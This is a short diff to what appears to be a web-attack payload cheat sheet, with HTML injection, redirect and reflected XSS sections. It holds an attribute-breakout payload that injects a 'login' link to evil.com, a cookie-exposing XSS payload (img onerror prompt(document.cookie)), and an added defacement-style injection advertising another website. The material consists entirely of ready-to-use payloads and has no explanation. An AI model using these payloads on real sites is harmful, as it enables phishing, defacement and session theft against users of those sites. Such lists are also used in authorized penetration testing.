@@ -5,6 +5,7 @@ HTMLi:
 
 Redirect:
 "/><img src="x"><a href="https://evil.com">login</a>
+<h1><font Color=red>Visit  Our  New  WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>
 
 RXSS:
 <img src/onerror=prompt(document.cookie)>
